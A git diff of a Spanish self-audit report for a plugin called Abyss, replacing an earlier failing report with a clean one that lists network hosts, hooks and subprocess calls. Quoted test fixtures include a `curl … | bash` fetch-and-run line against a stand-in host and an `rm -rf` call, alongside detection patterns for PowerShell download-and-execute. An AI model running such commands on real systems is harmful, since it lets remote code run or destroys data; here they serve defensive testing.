@@ -2,244 +2,87 @@
 
 *[English version](AUDITORIA_DE_ABYSS.en.md)*
 
----
-
-## Segunda pasada, 9-sep-2026: de «rompe» a «sin hallazgos»
-
-El informe de abajo es el PRIMERO, y se queda como está: es lo que el auditor encontró la
-primera vez y borrarlo sería borrar la historia. Esto es lo que dice hoy, sobre el mismo
-repositorio, después de arreglar lo que él mismo señaló.
-
-**Veredicto: `sin hallazgos`.** Ninguno de los cuatro que puntúan. La cuarta comprobación
-—la que de verdad importa, qué sale de la máquina— sale limpia, y la primera también desde
-que el paquete lleva autor declarado.
-
-Conviene decir qué significa y qué no: es «hasta donde esta vara mira, no encontré nada», y
-la vara mira cinco cosas concretas. No es un certificado de que el paquete sea bueno.
-
-Qué cambió, y por qué el número bajó tanto:
-
-- **Los hosts, declarados.** Los 35 que el código usa y ningún README nombraba están ahora
-  en `README.md` y `README.en.md`, agrupados por qué habilidad los llama, cuándo, y cuáles
-  no tocan la red sin clave. Los ocho de fabricantes (`vivo.com`, `zeiss.com`, `nikon.com`…)
-  no se llaman nunca: son destinos a los que el visor puede ABRIR el navegador.
-- **Las pruebas dejaron de acusarse a sí mismas.** Un fichero que prueba a un auditor tiene
-  que inventarse dominios para que los cace, y este los contaba como llamadas reales:
-  `api.declarado.com`, `api.oculto.net`, `api.sinesquema.io`, `copia-sospechosa.example`…
-  Ahora hay una tercera categoría, `hosts_en_pruebas`, con el mismo criterio que ya se
-  aplicaba a `vendor/dist/build`: **se declaran, no se acusan**. Son 37.
-- **Un perfil de navegador de 782 MB** se había quedado dentro del paquete y aportaba él solo
-  3.082 hallazgos, con dominios que salían de una lista de bloqueo de Brave. Fuera, y con el
-  perfil viviendo ya en la caché del sistema.
-- **El informe publicable ya no lleva la ruta absoluta** de la máquina donde se ejecutó: un
-  documento que se publica no tiene por qué decir en qué carpeta de quién se generó.
-
-- **El autor, declarado.** Era el último hallazgo vivo y no era un defecto de código:
-  faltaba decir quién firma. Ahora está en `LICENSE` (el titular del copyright), en
-  `.claude-plugin/plugin.json` (el campo que lee esta comprobación) y en
-  `.claude-plugin/marketplace.json` (lo que ve quien instala). En ningún otro sitio del
-  repositorio: la prueba que lo vigila tiene esos tres ficheros como única excepción.
-
-Lo que NO cambió: las comprobaciones 2 y 3 seguían en cero antes y siguen en cero ahora.
-Este paquete nunca escondió un comando ni escribió fuera de su sitio sin declararlo.
-
----
-
-
-Primer informe de `abyss/auditar.py` sobre el propio repositorio, generado con:
+Informe de `abyss/auditar.py` sobre el propio repositorio, generado con:
 
 ```
 python abyss/auditar.py . --markdown docs/AUDITORIA_DE_ABYSS.md
 ```
 
-Todo lo que sigue, a partir del título `# Auditoría de …`, es la salida
-TAL CUAL del guion (`a_markdown()`), sin editar ni un hallazgo — incluido lo
-que suspenda: el manifiesto de procedencia no tiene autor real (ver
-comprobación 1 más abajo). Dos notas honestas de quien corrió esta auditoría,
-NO del propio guion, antes de leerla:
+Todo lo que sigue, a partir del título `# Auditoría de …`, es la salida tal cual
+del guion, con una sustitución a mano: el nombre del autor, que ya firma en
+`.claude-plugin/plugin.json`, aparece como `<autor declarado en plugin.json>`. El
+paquete se auditó desde su raíz (`.`) para que la comprobación 1 alcance el
+manifiesto.
 
-1. **Ruta anonimizada**: `auditar.py` imprime la ruta absoluta que se le da;
-   aquí se ha sustituido a mano por `<raíz del repo Abyss>` porque, en la
-   máquina donde se generó este informe, esa ruta lleva una carpeta de
-   usuario personal — regla dura de este repo (nada de rutas `C:/Users/
-   <alguien>` publicadas). El resto del informe no se ha tocado.
-2. **`pruebas/` cuenta como código auditado, a propósito**: se corrió sobre
-   la raíz del repo entero (no solo `abyss/`) para que la comprobación 1
-   (procedencia) alcance `.claude-plugin/plugin.json` y la comprobación 2
-   (comandos) alcance `hooks/hooks.json` — ninguno de los dos vive dentro de
-   `abyss/`. El precio es que la comprobación 4 (qué sale de la máquina)
-   también cuenta los dominios de ejemplo que la propia batería de pruebas
-   usa a propósito para poner a prueba AL GUION AUDITOR (`pruebas/
-   test_auditar.py`, `pruebas/test_vigia_dominios.py`, `pruebas/datos/
-   paquete_sintetico/malo.py`…) como si fueran red real del paquete
-   distribuido — no lo son. Quien lea la lista de hosts de la comprobación 4
-   tiene que separar los que vienen de `abyss/*.py` (reales) de los que
-   vienen de `pruebas/*.py` (fixtures). Una auditoría futura sobre
-   `abyss/` a secas perdería en cambio el manifiesto y los ganchos — ningún
-   corte es gratis, y `auditar.py` no decide por quien lee cuál importa.
-
-El hallazgo más real y persistente de los de la comprobación 4 (y el que de
-verdad vale la pena leer): varios servicios de red del paquete (Pollinations,
-Hugging Face, Cloudflare Workers AI, Together, AI Horde, Openverse, The Met,
-Art Institute of Chicago, Mapillary, Google Maps/Street View…) están
-nombrados en el README **por marca**, no por el host exacto que usa el
-código (`gen.pollinations.ai`, `router.huggingface.co`,
-`api.cloudflare.com`…) — es una comprobación honesta y esperada según la
-propia especificación de esta tanda ("con lo que salga, incluido lo que
-suspenda"), no un fallo de este informe.
+«Sin hallazgos» significa «hasta donde mira esta vara, no encontró nada»; la
+sección 6 dice qué no lee. No es un certificado de que el paquete sea bueno.
 
 ---
 
-**Veredicto**: rompe
+# Auditoría de `abyss`
+
+**Veredicto**: sin hallazgos
 
 ## Hallazgos
 
-| severidad | comprobación | fichero:línea | qué dice |
-|---|---|---|---|
-| roza | procedencia | `.claude-plugin/plugin.json` | ningún manifiesto declara un autor con nombre real (vacío o placeholder de plantilla) (sí hay 3 commit(s) de git, desde 2026-09-07T09:42:44+02:00: hay trazabilidad) |
-| rompe | red | `abyss/imagen.py:225` | el código usa el host "aihorde.net" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:151` | el código usa el host "api.artic.edu" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:175` | el código usa el host "api.cloudflare.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:359` | el código usa el host "api.declarado.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:369` | el código usa el host "api.oculto.net" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/exterocepcion.py:192` | el código usa el host "api.open-meteo.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:327` | el código usa el host "api.openverse.org" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:392` | el código usa el host "api.sinesquema.io" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:200` | el código usa el host "api.together.xyz" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:285` | el código usa el host "api.windy.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:156` | el código usa el host "artic.edu" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:120` | el código usa el host "collectionapi.metmuseum.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:332` | el código usa el host "commons.wikimedia.org" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:407` | el código usa el host "copia-sospechosa.example" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/vigia.py:154` | el código usa el host "copia.ejemplo.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:386` | el código usa el host "de-terceros.example.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/render3d.py:586` | el código usa el host "discourse.threejs.org" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_vigia_dominios.py:42` | el código usa el host "dominio-copia-falsa.net" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_vigia_dominios.py:103` | el código usa el host "dominio-jamas-visto.xyz" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_vigia_dominios.py:38` | el código usa el host "dominio-legitimo.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/taller.py:83` | el código usa el host "download.pytorch.org" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_mundo.py:334` | el código usa el host "e.org" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:416` | el código usa el host "ejemplo.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_lectura_visual.py:335` | el código usa el host "ejemplo.es" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_mundo.py:305` | el código usa el host "ejemplo.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:334` | el código usa el host "es.wikipedia.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:163` | el código usa el host "gen.pollinations.ai" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/exterocepcion.py:129` | el código usa el host "geocoding-api.open-meteo.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/lectura_visual.py:334` | el código usa el host "github.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:256` | el código usa el host "graph.mapillary.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_mundo.py:407` | el código usa el host "images.metmuseum.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:269` | el código usa el host "mapillary.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:226` | el código usa el host "maps.googleapis.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_vigia_dominios.py:64` | el código usa el host "otro-sitio-desconocido.io" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_vigia_dominios.py:81` | el código usa el host "paquete-de-siempre.com" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/imagen.py:212` | el código usa el host "router.huggingface.co" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/datos/paquete_sintetico/malo.py:12` | el código usa el host "telemetria.dominio-no-declarado.net" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:399` | el código usa el host "tercera.example.net" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/render3d.py:585` | el código usa el host "threejs.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/infografia.py:148` | el código usa el host "w3.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:319` | el código usa el host "wikidata.org" y ningún README del paquete lo nombra |
-| rompe | red | `abyss/mundo.py:298` | el código usa el host "windy.com" y ningún README del paquete lo nombra |
-| rompe | red | `pruebas/test_auditar.py:312` | el código usa el host "x.example.com" y ningún README del paquete lo nombra |
+Sin hallazgos **en lo que esta vara mira**, en las cuatro comprobaciones con veredicto (procedencia, comandos, permisos, red) — no es "no hay nada": es "hasta donde mira esta vara, no lo vio". Ver la sección 6 para qué no leyó.
 
 ## 1 · Procedencia
 - Manifiestos encontrados: ['.claude-plugin/plugin.json', '.claude-plugin/marketplace.json']
-  - `.claude-plugin/plugin.json`: autor = (vacío) — placeholder/sin nombre real
-  - `.claude-plugin/marketplace.json`: autor = el usuario — placeholder/sin nombre real
-- Historial: 3 commit(s), primero 2026-09-07T09:42:44+02:00
+  - `.claude-plugin/plugin.json`: autor = <autor declarado en plugin.json>
+  - `.claude-plugin/marketplace.json`: autor = <autor declarado en plugin.json>
+- Historial: 18 commit(s), primero 2026-09-07T09:42:44+02:00
 
 ## 2 · Comandos
-- `hooks/hooks.json:8` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --arranque`
-- `hooks/hooks.json:17` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --arranque`
-- `hooks/hooks.json:26` SessionStart: `python "${CLAUDE_PLUGIN_ROOT}/abyss/cuerpo.py" --arranque`
-- `hooks/hooks.json:37` SessionEnd: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --cierre`
-- `hooks/hooks.json:48` UserPromptSubmit **(cada mensaje)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/continuidad.py" --despertar`
-- `hooks/hooks.json:57` UserPromptSubmit **(cada mensaje)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/cuerpo.py" --despertar`
-- `hooks/hooks.json:68` PostToolUse **(tras cada herramienta)**: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --herramienta`
-- `hooks/hooks.json:79` Stop: `python "${CLAUDE_PLUGIN_ROOT}/abyss/vigia.py" --verificar`
-- `hooks/hooks.json:88` Stop: `python "${CLAUDE_PLUGIN_ROOT}/abyss/huella.py" --fin`
+- `instalar.py:708` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([python_exe, '-c', f'import {nombre_import}'],`
+- `instalar.py:763` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['nvidia-smi'], capture_output=True, text=True, timeout=5)`
+- `instalar.py:806` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(comando, capture_output=True, text=True, timeout=600)`
 - `abyss/auditar.py:40` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `(`curl/wget/iwr/irm | bash/sh/iex`) — como EVIDENCIA (no todo uso de`
-- `abyss/auditar.py:117` llamada a subprocess/os.system/eval/exec: `r'(subprocess\.\w+|os\.system\(|[^.\w]eval\(|[^.\w]exec\(|Invoke-Expression|(?<!\w)iex\s|powershell\s+-enc)', re.I)`
-- `abyss/auditar.py:364` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['git', '-C', ruta, 'log', '--format=%cI'],`
-- `abyss/auditar.py:369` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `abyss/auditar.py:475` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `'nota': 'descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex)',`
-- `abyss/continuidad.py:337` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, os.path.join(CODE, 'varas.py'), '--index'],`
-- `abyss/continuidad.py:339` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.DEVNULL)  # nunca heredar el stdin del propio gancho`
-- `abyss/cuerpo.py:103` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
-- `abyss/cuerpo.py:113` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['wmic', 'cpu', 'get', 'loadpercentage'], capture_output=True, text=True, timeout=5)`
-- `abyss/cuerpo.py:182` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)`
-- `abyss/cuerpo.py:216` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
-- `abyss/cuerpo.py:237` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
-- `abyss/cuerpo.py:270` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pmset', '-g', 'batt'], capture_output=True, text=True, timeout=5)`
-- `abyss/huella.py:231` llamada a subprocess/os.system/eval/exec: `con `Popen` (no `subprocess.run`, que no lo expone) porque quien fotografía`
-- `abyss/huella.py:236` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(['powershell', '-NoProfile', '-NonInteractive', '-Command', cmd],`
-- `abyss/huella.py:237` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)`
-- `abyss/huella.py:242` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `abyss/huella.py:334` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ss', '-ltnp'], capture_output=True, text=True, timeout=5)`
-- `abyss/huella.py:340` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['lsof', '-iTCP', '-sTCP:LISTEN', '-P', '-n'], capture_output=True, text=True, timeout=5)`
-- `abyss/huella.py:353` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ps', '-eo', 'pid,lstart,comm'], capture_output=True, text=True, timeout=5)`
-- `abyss/huella.py:638` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, timeout=8)`
-- `abyss/lectura_visual.py:174` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass'] + args,`
-- `abyss/lectura_visual.py:255` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(args, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)`
-- `abyss/lectura_visual.py:355` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', '$input | Set-Clipboard'],`
-- `abyss/lectura_visual.py:359` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pbcopy'], input=texto_plano, text=True, encoding='utf-8', errors='replace', timeout=8)`
-- `abyss/lectura_visual.py:362` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['xclip', '-selection', 'clipboard'], input=texto_plano, text=True,`
-- `abyss/lectura_visual.py:653` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', script],`
-- `abyss/render3d.py:998` llamada a subprocess/os.system/eval/exec: `subprocess.run(cmd, capture_output=True, timeout=45)`
+- `abyss/auditar.py:175` llamada a subprocess/os.system/eval/exec: `r'(subprocess\.\w+|os\.system\(|[^.\w]eval\(|[^.\w]exec\(|Invoke-Expression|(?<!\w)iex\s|powershell\s+-enc)', re.I)`
+- `abyss/auditar.py:455` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['git', '-C', ruta, 'log', '--format=%cI'],`
+- `abyss/auditar.py:460` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
+- `abyss/auditar.py:566` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `'nota': 'descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex)',`
+- `abyss/continuidad.py:342` llamada a subprocess/os.system/eval/exec: `r = subprocess.run([sys.executable, os.path.join(CODE, 'varas.py'), '--index'],`
+- `abyss/continuidad.py:344` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.DEVNULL)  # nunca heredar el stdin del propio gancho`
+- `abyss/cuerpo.py:108` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
+- `abyss/cuerpo.py:118` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['wmic', 'cpu', 'get', 'loadpercentage'], capture_output=True, text=True, timeout=5)`
+- `abyss/cuerpo.py:187` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['vm_stat'], capture_output=True, text=True, timeout=5)`
+- `abyss/cuerpo.py:221` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
+- `abyss/cuerpo.py:242` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(`
+- `abyss/cuerpo.py:275` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pmset', '-g', 'batt'], capture_output=True, text=True, timeout=5)`
+- `abyss/huella.py:240` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(['powershell', '-NoProfile', '-NonInteractive', '-Command', cmd],`
+- `abyss/huella.py:241` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)`
+- `abyss/huella.py:246` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
+- `abyss/huella.py:340` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ss', '-ltnp'], capture_output=True, text=True, timeout=5)`
+- `abyss/huella.py:346` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['lsof', '-iTCP', '-sTCP:LISTEN', '-P', '-n'], capture_output=True, text=True, timeout=5)`
+- `abyss/huella.py:359` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['ps', '-eo', 'pid,ppid,lstart,comm'], capture_output=True, text=True, timeout=5)`
+- `abyss/huella.py:676` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['taskkill', '/PID', str(pid), '/F'], capture_output=True, text=True, timeout=8)`
+- `abyss/kinetica.py:951` llamada a subprocess/os.system/eval/exec: `subprocess.Popen(['open', url], close_fds=True)`
+- `abyss/kinetica.py:953` llamada a subprocess/os.system/eval/exec: `subprocess.Popen(['xdg-open', url], close_fds=True)`
+- `abyss/kinetico_servidor.py:80` llamada a subprocess/os.system/eval/exec: `subprocess.Popen(["open", ruta], close_fds=True)`
+- `abyss/kinetico_servidor.py:82` llamada a subprocess/os.system/eval/exec: `subprocess.Popen(["xdg-open", ruta], close_fds=True)`
+- `abyss/lectura_visual.py:173` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-ExecutionPolicy', 'Bypass'] + args,`
+- `abyss/lectura_visual.py:254` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(args, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)`
+- `abyss/lectura_visual.py:354` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', '$input | Set-Clipboard'],`
+- `abyss/lectura_visual.py:358` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['pbcopy'], input=texto_plano, text=True, encoding='utf-8', errors='replace', timeout=8)`
+- `abyss/lectura_visual.py:361` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['xclip', '-selection', 'clipboard'], input=texto_plano, text=True,`
+- `abyss/lectura_visual.py:652` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(['powershell', '-NoProfile', '-NonInteractive', '-Command', script],`
+- `abyss/navegador.py:160` llamada a subprocess/os.system/eval/exec: `subprocess.Popen(cmd, close_fds=True)`
+- `abyss/navegador_cdp.py:160` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(`
+- `abyss/navegador_cdp.py:165` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)`
+- `abyss/presenta.py:507` llamada a subprocess/os.system/eval/exec: `self.proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)`
+- `abyss/presenta.py:539` llamada a subprocess/os.system/eval/exec: `r = subprocess.run(cmd, capture_output=True, timeout=120)`
+- `abyss/presenta.py:618` llamada a subprocess/os.system/eval/exec: `"""`subprocess.run([python, abyss/<nombre_script>] + args)` con `ABYSS_PROYECTO=proyecto``
+- `abyss/presenta.py:625` llamada a subprocess/os.system/eval/exec: `return subprocess.run([sys.executable, ruta] + list(args), input="", capture_output=True,`
+- `abyss/render3d.py:1136` llamada a subprocess/os.system/eval/exec: `subprocess.run(cmd, capture_output=True, timeout=45)`
 - `abyss/rutas.py:61` llamada a subprocess/os.system/eval/exec: ``varas.py --index` con `subprocess.run` heredando el stdin del propio gancho — si`
+- `abyss/video_composicion.py:75` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)`
 - `abyss/video_pintura.py:108` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen(cmd, stdin=subprocess.PIPE)`
 - `abyss/vigia.py:39` llamada a subprocess/os.system/eval/exec: ``Invoke-Expression`, `powershell -enc`) cuya fuente no esté en el turno. A`
 - `abyss/vigia.py:41` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `copias»), estos DOS tipos SÍ miran dentro de ellos: un `curl … | bash` suele`
-- `abyss/vigia.py:145` llamada a subprocess/os.system/eval/exec: `r'|\b(?:iwr|invoke-webrequest|irm|invoke-restmethod)\b[^\n|]*\|\s*(?:iex|invoke-expression)\b'`
-- `abyss/vigia.py:147` llamada a subprocess/os.system/eval/exec: `r'|\bwinget\s+install\b|\bchoco(?:latey)?\s+install\b|\bInvoke-Expression\b'`
-- `abyss/vigia.py:313` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `# `respuesta`, no `sin_codigo`) — un `curl … | bash` suele venir precisamente`
-- `pruebas/ayudas.py:69` llamada a subprocess/os.system/eval/exec: `Sin `errors='replace'` eso revienta el propio `subprocess.run` con un`
-- `pruebas/ayudas.py:72` llamada a subprocess/os.system/eval/exec: `return subprocess.run(`
-- `pruebas/test_auditar.py:137` llamada a subprocess/os.system/eval/exec: `subprocess.run(cmd, cwd=tmp, check=True, capture_output=True)`
-- `pruebas/test_auditar.py:139` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'add', '.'], cwd=tmp, check=True, capture_output=True)`
-- `pruebas/test_auditar.py:140` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'commit', '-q', '-m', 'uno'], cwd=tmp, check=True, capture_output=True)`
-- `pruebas/test_auditar.py:164` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'add', '.'], cwd=d, check=True, capture_output=True)`
-- `pruebas/test_auditar.py:165` llamada a subprocess/os.system/eval/exec: `subprocess.run(['git', 'commit', '-q', '-m', 'dos'], cwd=d, check=True, capture_output=True)`
-- `pruebas/test_auditar.py:174` llamada a subprocess/os.system/eval/exec: `with mock.patch('subprocess.run', side_effect=AssertionError('no debería llamarse')):`
-- `pruebas/test_auditar.py:181` llamada a subprocess/os.system/eval/exec: `with mock.patch('subprocess.run', side_effect=FileNotFoundError()):`
-- `pruebas/test_auditar.py:305` llamada a subprocess/os.system/eval/exec: `(Path(d) / 'x.py').write_text('import os\nos.system("rm -rf /tmp/x")\n', encoding='utf-8')`
-- `pruebas/test_auditar.py:312` descarga con tubería a un intérprete (curl/wget/iwr/irm | bash/sh/iex): `(Path(d) / 'y.sh').write_text('curl -s https://x.example.com/i.sh | bash\n', encoding='utf-8')`
-- `pruebas/test_huella.py:405` llamada a subprocess/os.system/eval/exec: `proc = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'])`
-- `pruebas/test_huella.py:431` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_instalador_no_cuelga.py:72` llamada a subprocess/os.system/eval/exec: `return subprocess.run(`
-- `pruebas/test_instalador_no_cuelga.py:82` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_instalador_no_cuelga.py:91` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_instalador_no_cuelga.py:101` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_lectura_visual.py:179` llamada a subprocess/os.system/eval/exec: `"""`_ocr_tesseract()` en proceso, con `subprocess.run` sustituido (nunca toca`
-- `pruebas/test_lectura_visual.py:577` llamada a subprocess/os.system/eval/exec: ``ok: False` SIN ejecutar ningún `subprocess.run` — se comprueba con un`
-- `pruebas/test_leer_stdin_no_bloquea.py:14` llamada a subprocess/os.system/eval/exec: `Se usa `subprocess.Popen` a mano (no `ayudas.ejecutar`, que usa `subprocess.run``
-- `pruebas/test_leer_stdin_no_bloquea.py:55` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
-- `pruebas/test_leer_stdin_no_bloquea.py:57` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
-- `pruebas/test_leer_stdin_no_bloquea.py:66` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_leer_stdin_no_bloquea.py:95` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
-- `pruebas/test_leer_stdin_no_bloquea.py:100` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
-- `pruebas/test_leer_stdin_no_bloquea.py:110` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_leer_stdin_no_bloquea.py:129` llamada a subprocess/os.system/eval/exec: ``varas.py --index` con `subprocess.run` — si no se le pasa `stdin=DEVNULL`, el`
-- `pruebas/test_leer_stdin_no_bloquea.py:134` llamada a subprocess/os.system/eval/exec: `fuente, que la llamada lleva `stdin=subprocess.DEVNULL` — con el fallo, esta`
-- `pruebas/test_leer_stdin_no_bloquea.py:141` llamada a subprocess/os.system/eval/exec: `# la llamada a subprocess.run completa: desde 'varas.py' hasta el próximo ')'`
-- `pruebas/test_leer_stdin_no_bloquea.py:142` llamada a subprocess/os.system/eval/exec: `# que cierra subprocess.run(...) — basta con mirar los ~300 caracteres siguientes`
-- `pruebas/test_leer_stdin_no_bloquea.py:144` llamada a subprocess/os.system/eval/exec: `self.assertIn('stdin=subprocess.DEVNULL', fragmento,`
-- `pruebas/test_leer_stdin_no_bloquea.py:145` llamada a subprocess/os.system/eval/exec: `'subprocess.run([sys.executable, ..., "varas.py", "--index"], ...) '`
-- `pruebas/test_leer_stdin_no_bloquea.py:146` llamada a subprocess/os.system/eval/exec: `'debe pasar stdin=subprocess.DEVNULL para no heredar el del gancho')`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:47` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:49` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:58` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:79` llamada a subprocess/os.system/eval/exec: `with subprocess.Popen(`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:81` llamada a subprocess/os.system/eval/exec: `stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,`
-- `pruebas/test_stdin_no_se_lee_dos_veces.py:87` llamada a subprocess/os.system/eval/exec: `except subprocess.TimeoutExpired:`
-- `pruebas/test_taller.py:109` llamada a subprocess/os.system/eval/exec: `self.proc = subprocess.Popen(`
-- `pruebas/test_taller.py:112` llamada a subprocess/os.system/eval/exec: `stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, encoding='utf-8',`
